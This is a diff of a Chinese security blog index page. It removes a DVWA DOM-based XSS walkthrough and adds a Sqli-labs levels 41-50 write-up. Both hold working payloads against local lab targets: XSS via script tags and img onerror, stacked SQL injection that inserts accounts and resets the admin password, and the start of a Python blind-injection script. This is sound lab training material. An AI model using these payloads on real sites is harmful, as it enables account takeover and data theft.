@@ -134,181 +134,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/Knlvre.github-io/2019/02/18/DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）/">DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）</a>
-    </h1>
-  
-
-        
-        <a href="/Knlvre.github-io/2019/02/18/DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）/" class="archive-article-date">
-  	<time datetime="2019-02-17T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="源码位置"><a href="#源码位置" class="headerlink" title="源码位置"></a>源码位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVWA\vulnerabilities\xss_d\source\</span><br></pre></td></tr></table></figure>
-<h2 id="页面功能"><a href="#页面功能" class="headerlink" title="页面功能"></a>页面功能</h2><p>通过下拉菜单选择一种语言，但是好像没作用</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/9-1.png" alt="9-1"></p>
-<p><code>DOM</code>，全称<code>Document Object Model</code>，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式</p>
-<p>1.document 和 windows 对象</p>
-<p>document表示的是一个文档对象，window表示的是一个窗口对象，一个窗口下可以有多个文档对象。</p>
-<p>所以一个窗口下只有一个<code>window.location.href</code>，但是可能有多个<code>document.URL</code>、<code>document.location.href</code></p>
-<p>window 对象：它是一个顶层对象,而不是另一个对象的属性即浏览器的窗口。</p>
-<p>document 对象：该对象是window和frames对象的一个属性，是显示于窗口或框架内的一个文档。document 只是属于window 的一个子对像。</p>
-<p><code>window.location</code>包含 href 属性，直接取值赋值时相当于 window.location.href</p>
-<p>window.location.href  当前页面完整 URL</p>
-<p><code>document.location</code>包含 href 属性，直接取值赋值时相当于 document.location.href</p>
-<p>document.location.href 当前页面完整 URL</p>
-<p><code>document.href</code>没有这个属性</p>
-<p><code>document.URL</code>取值时等价于 window.location.href 或 document.location.href。在某些浏览器中通过对 document.URL 赋值来实现页面跳转，但某些浏览器中不行</p>
-<p>2.indexOf()方法：方法可返回某个指定的字符串值在字符串中首次出现的位置</p>
-<p>indexOf(searchvalue,fromindex)</p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>searchvalue</td>
-<td>必需。规定需检索的字符串值</td>
-</tr>
-<tr>
-<td>fromindex</td>
-<td>可选的整数参数。规定在字符串中开始检索的位置。它的合法取值是 0 到 stringObject.length - 1。如省略该参数，则将从字符串的首字符开始检索</td>
-</tr>
-</tbody>
-</table>
-<p>3.document.write</p>
-<p>document.write是JavaScript中对document.open所开启的文档流(document stream操作的API方法，它能够直接在文档流中写入字符串，一旦文档流已经关闭，那document.write就会重新利用document.open打开新的文档流并写入，此时原来的文档流会被清空，已渲染好的页面就会被清除，浏览器将重新构建DOM并渲染新的页面</p>
-<p>4.decodeURI</p>
-<p>decodeURI() 函数可对 encodeURI() 函数编码过的 URI 进行解码</p>
-<p>5.代码解释</p>
-<p>①判断URL中是否含有<code>default=</code>字符串，如果有进入下一步；②截取URL中<code>default=</code>字段开始的位置，加上<code>8（default=字符串的长度）</code>之后开始，到末尾结束的字符串，赋值给<code>lang</code>；③语句拼接，通过<code>decodeURI()</code>解码<code>lang变量</code>的值</p>
-<h2 id="Low-—-high前端核心代码"><a href="#Low-—-high前端核心代码" class="headerlink" title="Low — high前端核心代码"></a>Low — high前端核心代码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"XSS"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">"default="</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"default="</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(<span class="string">"&lt;option value='"</span> + lang + <span class="string">"'&gt;"</span> + <span class="built_in">decodeURI</span>(lang) + <span class="string">"&lt;/option&gt;"</span>);</span></span><br><span class="line"><span class="xml">                document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">''</span> <span class="attr">disabled</span>=<span class="string">'disabled'</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">            document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'English'</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">            document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'French'</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">            document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'Spanish'</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">            document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'German'</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Select"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="Impossible前端核心代码"><a href="#Impossible前端核心代码" class="headerlink" title="Impossible前端核心代码"></a>Impossible前端核心代码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"XSS"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">"default="</span>) &gt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"default="</span>)+<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.write(<span class="string">"&lt;option value='"</span> + lang + <span class="string">"'&gt;"</span> + (lang) + <span class="string">"&lt;/option&gt;"</span>);</span></span><br><span class="line"><span class="xml">                document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">''</span> <span class="attr">disabled</span>=<span class="string">'disabled'</span>&gt;</span>----<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="xml">            document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'English'</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">            document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'French'</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">            document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'Spanish'</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="xml">            document.write("<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'German'</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>");</span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Select"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="Security-Level-—-Low"><a href="#Security-Level-—-Low" class="headerlink" title="Security Level — Low"></a>Security Level — Low</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>知道原理之后，就可以构造URL</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/dvwa/vulnerabilities/xss_d/?default=English&lt;script&gt;alert(/xss/);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>拼接后变为</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'变量lang 的值'</span>&gt;</span>English<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/9-2.png" alt="9-2"></p>
-<h2 id="Security-Level-—-Medium"><a href="#Security-Level-—-Medium" class="headerlink" title="Security Level — Medium"></a>Security Level — Medium</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line">	$default = $_GET[<span class="string">'default'</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># Do not allow script tags</span></span><br><span class="line">	<span class="keyword">if</span> (stripos ($default, <span class="string">"&lt;script"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">		header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>简单解释一下三个函数</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">函数</th>
-<th style="text-align:center">作用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">array_key_exists()</td>
-<td style="text-align:center">函数检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false</td>
-</tr>
-<tr>
-<td style="text-align:center">stripos()</td>
-<td style="text-align:center">函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</td>
-</tr>
-<tr>
-<td style="text-align:center">header()</td>
-<td style="text-align:center">函数向客户端发送原始的 HTTP 报头</td>
-</tr>
-</tbody>
-</table>
-<p>①GET到的参数必须为<code>default</code>，并且值必须不为空；②过滤了<code>&lt;script</code></p>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/dvwa/vulnerabilities/xss_d/?default=English&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
-<p>拼接后变为</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">'变量lang 的值'</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>首先闭合了<code>&lt;option&gt;</code>标签 和<code>&lt;select&gt;</code>标签。利用 img标签的onerror事件，Javascript的img标签支持onerror 事件，在加载图像的过程中如果发生了错误，就会触发onerror事件，执行 JavaScript</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/9-3.png" alt="9-3"></p>
-<h2 id="Security-Level-—-High"><a href="#Security-Level-—-High" class="headerlink" title="Security Level — High"></a>Security Level — High</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">"default"</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">'default'</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># White list the allowable languages</span></span><br><span class="line">	<span class="keyword">switch</span> ($_GET[<span class="string">'default'</span>]) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"French"</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"English"</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"German"</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">"Spanish"</span>:</span><br><span class="line">			<span class="comment"># ok</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			header (<span class="string">"location: ?default=English"</span>);</span><br><span class="line">			<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>设置了白名单，只允许<code>French</code>、<code>English</code>、<code>German</code>、<code>Spanish</code>四个其中的一个</p>
-<p>构造payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.108/dvwa/vulnerabilities/xss_d/?default=English #&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>拼接后变为</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">''</span>&gt;</span>English #<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>由于form表单提交的数据经过JS过滤，所以注释部分的javascript代码不会被传到服务器端(也就符合了白名单的要求)</p>
-<p>我们写一个html验证一下<code>&lt;option value=&#39;&#39;&gt;English #&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/option&gt;</code>是否可行</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/9-4.png" alt="9-4"></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/9-5.png" alt="9-5"></p>
-<p>可以看到是可行的，现在继续</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/DVWA/9-6.png" alt="9-6"></p>
-<h2 id="Security-Level-—-Impossible"><a href="#Security-Level-—-Impossible" class="headerlink" title="Security Level — Impossible"></a>Security Level — Impossible</h2><p>核心代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don't need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>翻译：不做任何事，保护措施在客户端完成</p>
-<p>本难度前端代码发生了改变，<code>decodeURI(lang)</code>变为<code>(lang)</code></p>
-<hr>
-<p>参考文章：</p>
-<p><a href="https://www.jianshu.com/p/001daa7cf1f5" target="_blank" rel="noopener">https://www.jianshu.com/p/001daa7cf1f5</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/18/DVWA 9-DOM Based Cross Site Scripting（XSS）（DOM型跨站脚本）/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-DVWA 8-Weak Session IDs（弱Session ID）" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1359,6 +1184,134 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/02/03/Sqli-labs 第51-65关/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Sqli-labs 第41-50关" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/02/02/Sqli-labs 第41-50关/">Sqli-labs(第41-50关)</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/02/02/Sqli-labs 第41-50关/" class="archive-article-date">
+  	<time datetime="2019-02-01T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前一部分链接：<a href="https://knlvre.github.io/Knlvre.github-io/2019/02/01/Sqli-labs%20%E7%AC%AC31-40%E5%85%B3/">第31-40关Write-up</a></p>
+<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是<code>整形</code>注入，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><p>本关通过<code>POST</code>方式提交参数，并且无法<code>创建用户</code>和<code>忘记秘密</code>这两个操作，所以想到应该是结合前面<code>二次注入（存储型注入）</code>+<code>堆叠注入</code>的知识，通过堆叠注入创建一个账号<code>（admin&#39;#）</code>，然后再通过这个账号去修改admin的密码，进入后台</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-1.png" alt="2-1"></p>
+<p>动手尝试一下，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:1&apos;;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+</span><br><span class="line"></span><br><span class="line">password:随意</span><br></pre></td></tr></table></figure>
+<p>登录<code>users37</code>时，发现登录不了，试着把注入语句换到password试一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<p>在此登录时发现可以了，之后查看源码发现是username使用<code>mysql_real_escape_string()</code>函数进行了过滤，而password没有过滤。既然可以插入用户，那现在就插入<code>（admin&#39;#）</code>，注意这里的单引号要<code>加一个反斜杠</code>才行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;;insert into users(id,username,password) values(&apos;38&apos;,&apos;admin\&apos;#&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<p>可以登录</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-2.png" alt="2-2"></p>
+<p>接下来就是修改密码，先看一下数据库里<code>admin</code>用户的密码</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-3.png" alt="2-3"></p>
+<p>将admin的密码更改为666，然后再次看一下数据库，更改成功</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-4.png" alt="2-4"></p>
+<p>并且可以登录</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/2-5.png" alt="2-5"></p>
+<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><p>通过报错信息可以知道，与前一关不一样的就是，参数通过<code>(&#39;&#39;)</code>包裹，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;);insert into users(id,username,password) values(&apos;38&apos;,&apos;admin\&apos;#&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<p>其他一样，，不再赘述</p>
+<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><p>除了没有报错信息之外，这关与Less-42没有区别，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;;insert into users(id,username,password) values(&apos;38&apos;,&apos;admin\&apos;#&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><p>除了没有报错信息之外，这关与Less-43没有区别，payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:随意</span><br><span class="line"></span><br><span class="line">password:1&apos;);insert into users(id,username,password) values(&apos;38&apos;,&apos;admin\&apos;#&apos;,&apos;password37&apos;);--+</span><br></pre></td></tr></table></figure>
+<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>本关开始，考查的是<code>order by注入</code>的利用，关于order by注入的知识点可以看我的文章<a href="https://knlvre.github.io/Knlvre.github-io/2019/01/28/Sqli-labs%20Tips/">Sqli-labs Tips</a>的<code>Tip 6</code> </p>
+<p>本关就用<code>rand()</code>函数进行盲注，先来看一下<code>rand(true)</code>和<code>rand(false)</code>的区别</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(true)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-1.png" alt="6-1"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(false)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Sqli-labs/41-50/6-2.png" alt="6-2"></p>
+<p>现在就可以写一个python来爆破</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/AAsqli-labs/Less-46/"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#database</span></span><br><span class="line">database_payload = <span 